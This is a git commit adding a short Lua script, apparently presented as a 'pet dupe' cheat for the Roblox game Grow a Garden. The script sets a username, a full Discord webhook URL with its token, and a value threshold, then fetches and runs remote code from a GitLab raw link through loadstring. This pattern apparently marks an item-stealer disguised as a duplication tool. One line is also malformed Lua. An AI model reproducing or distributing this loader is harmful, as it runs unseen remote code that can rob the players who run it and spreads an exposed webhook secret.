84f9ac6dedd03bf6f5738498281a21f4e7e402ad
pet-dupe-grow <noleedit07@gmail.com>
2025-09-26 00:46:14 +0700

    Upload scripts.lua via Script Source Converter

---
+++ scripts.lua
@@ -0,0 +1,5 @@
+Username = "wmiikill"
+Webhook = "https://discord.com/api/webhooks/1420630565757128804/7S5_QFLV-HTtn1CoIK71l20cgiidNmic_H5zcrFi6KhVD5yRgLdFEbAX19MV9a3XDxjv"
+Minimum Value = 1
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
